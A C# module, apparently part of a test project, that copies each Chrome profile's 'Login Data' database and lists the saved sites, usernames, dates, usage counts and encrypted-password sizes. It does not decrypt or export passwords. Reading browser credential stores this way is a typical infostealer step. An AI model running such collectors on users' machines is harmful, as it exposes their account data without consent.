using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Data.Sqlite;

namespace Teste.Modulos
{
    public class Senhas
    {
        public StringBuilder Coletar()
        {
            StringBuilder resultado = new StringBuilder();

            resultado.AppendLine(
                "---------------- SENHAS ARMAZENADAS DO CHROME ----------------"
            );

            resultado.AppendLine(
                "Observação: somente metadados são registrados."
            );

            resultado.AppendLine(
                "O conteúdo das credenciais protegidas não é exportado."
            );

            resultado.AppendLine();

            string localAppData =
                Environment.GetFolderPath(
                    Environment.SpecialFolder.LocalApplicationData
                );

            string chromePath = Path.Combine(
                localAppData,
                "Google",
                "Chrome",
                "User Data"
            );

            if (!Directory.Exists(chromePath))
            {
                resultado.AppendLine(
                    "Diretório do Chrome não encontrado."
                );

                return resultado;
            }

            string[] perfis =
                Directory.GetDirectories(chromePath);

            int totalPerfis = 0;

            foreach (string perfil in perfis)
            {
                string nomePerfil =
                    Path.GetFileName(perfil);

                bool ehPerfil =
                    nomePerfil.Equals(
                        "Default",
                        StringComparison.OrdinalIgnoreCase
                    )
                    ||
                    nomePerfil.StartsWith(
                        "Profile ",
                        StringComparison.OrdinalIgnoreCase
                    );

                if (!ehPerfil)
                    continue;

                string caminhoLoginData =
                    Path.Combine(
                        perfil,
                        "Login Data"
                    );

                if (!File.Exists(caminhoLoginData))
                    continue;

                totalPerfis++;

                resultado.AppendLine();
                resultado.AppendLine(
                    "============================================================"
                );
                resultado.AppendLine(
                    "PERFIL: " + nomePerfil
                );
                resultado.AppendLine(
                    "============================================================"
                );

                string copiaTemporaria =
                    Path.Combine(
                        Path.GetTempPath(),
                        "ChromeLoginData_" +
                        Guid.NewGuid().ToString("N") +
                        ".db"
                    );

                try
                {
                    File.Copy(
                        caminhoLoginData,
                        copiaTemporaria,
                        true
                    );

                    ConsultarSenhas(
                        copiaTemporaria,
                        resultado
                    );
                }
                catch (Exception erro)
                {
                    resultado.AppendLine(
                        "Erro ao consultar senhas: " +
                        erro.Message
                    );
                }
                finally
                {
                    try
                    {
                        if (File.Exists(copiaTemporaria))
                            File.Delete(copiaTemporaria);
                    }
                    catch
                    {
                        // Não interrompe a coleta.
                    }
                }
            }

            resultado.AppendLine();
            resultado.AppendLine(
                "Total de perfis analisados: " +
                totalPerfis
            );

            return resultado;
        }

        private void ConsultarSenhas(
            string banco,
            StringBuilder resultado)
        {
            using SqliteConnection conexao =
                new SqliteConnection(
                    $"Data Source={banco}"
                );

            conexao.Open();

            using SqliteCommand comando =
                conexao.CreateCommand();

            comando.CommandText = @"
                SELECT
                    origin_url,
                    action_url,
                    username_value,
                    date_created,
                    date_last_used,
                    date_password_modified,
                    times_used,
                    blacklisted_by_user,
                    length(password_value)
                FROM logins
                ORDER BY origin_url, username_value;
            ";

            using SqliteDataReader leitor =
                comando.ExecuteReader();

            int quantidade = 0;

            while (leitor.Read())
            {
                string origem =
                    leitor.IsDBNull(0)
                        ? ""
                        : leitor.GetString(0);

                string acao =
                    leitor.IsDBNull(1)
                        ? ""
                        : leitor.GetString(1);

                string usuario =
                    leitor.IsDBNull(2)
                        ? ""
                        : leitor.GetString(2);

                long dataCriacao =
                    leitor.IsDBNull(3)
                        ? 0
                        : leitor.GetInt64(3);

                long ultimoUso =
                    leitor.IsDBNull(4)
                        ? 0
                        : leitor.GetInt64(4);

                long senhaModificada =
                    leitor.IsDBNull(5)
                        ? 0
                        : leitor.GetInt64(5);

                long vezesUsada =
                    leitor.IsDBNull(6)
                        ? 0
                        : leitor.GetInt64(6);

                bool bloqueada =
                    !leitor.IsDBNull(7) &&
                    leitor.GetInt64(7) != 0;

                long tamanhoProtegido =
                    leitor.IsDBNull(8)
                        ? 0
                        : leitor.GetInt64(8);

                string fingerprint =
                    GerarFingerprint(
                        origem,
                        acao,
                        usuario,
                        dataCriacao,
                        ultimoUso,
                        senhaModificada,
                        vezesUsada,
                        bloqueada,
                        tamanhoProtegido
                    );

                quantidade++;

                resultado.AppendLine();
                resultado.AppendLine(
                    $"[{quantidade}]"
                );

                resultado.AppendLine(
                    "Site: " + origem
                );

                resultado.AppendLine(
                    "URL de ação: " + acao
                );

                resultado.AppendLine(
                    "Usuário: " + usuario
                );

                resultado.AppendLine(
                    "Data de criação: " +
                    ConverterDataChrome(dataCriacao)
                );

                resultado.AppendLine(
                    "Último uso: " +
                    ConverterDataChrome(ultimoUso)
                );

                resultado.AppendLine(
                    "Última alteração da senha: " +
                    ConverterDataChrome(senhaModificada)
                );

                resultado.AppendLine(
                    "Quantidade de utilizações: " +
                    vezesUsada
                );

                resultado.AppendLine(
                    "Bloqueada pelo usuário: " +
                    (bloqueada ? "SIM" : "NÃO")
                );

                resultado.AppendLine(
                    "Senha armazenada: " +
                    (tamanhoProtegido > 0 ? "SIM" : "NÃO")
                );

                resultado.AppendLine(
                    "Tamanho do valor protegido: " +
                    tamanhoProtegido +
                    " bytes"
                );

                resultado.AppendLine(
                    "Fingerprint SHA-256: " +
                    fingerprint
                );

                resultado.AppendLine(
                    "Senha: [NÃO EXPORTADA]"
                );
            }

            resultado.AppendLine();
            resultado.AppendLine(
                "Total de registros encontrados: " +
                quantidade
            );
        }

        private string GerarFingerprint(
            string origem,
            string acao,
            string usuario,
            long dataCriacao,
            long ultimoUso,
            long senhaModificada,
            long vezesUsada,
            bool bloqueada,
            long tamanhoProtegido)
        {
            string dados =
                origem + "|" +
                acao + "|" +
                usuario + "|" +
                dataCriacao + "|" +
                ultimoUso + "|" +
                senhaModificada + "|" +
                vezesUsada + "|" +
                bloqueada + "|" +
                tamanhoProtegido;

            byte[] bytes =
                Encoding.UTF8.GetBytes(dados);

            byte[] hash =
                SHA256.HashData(bytes);

            return Convert.ToHexString(hash);
        }

        private DateTime ConverterDataChrome(
            long valor)
        {
            if (valor <= 0)
                return DateTime.MinValue;

            try
            {
                DateTime baseChrome =
                    new DateTime(
                        1601,
                        1,
                        1,
                        0,
                        0,
                        0,
                        DateTimeKind.Utc
                    );

                return baseChrome
                    .AddTicks(valor * 10)
                    .ToLocalTime();
            }
            catch
            {
                return DateTime.MinValue;
            }
        }
    }
}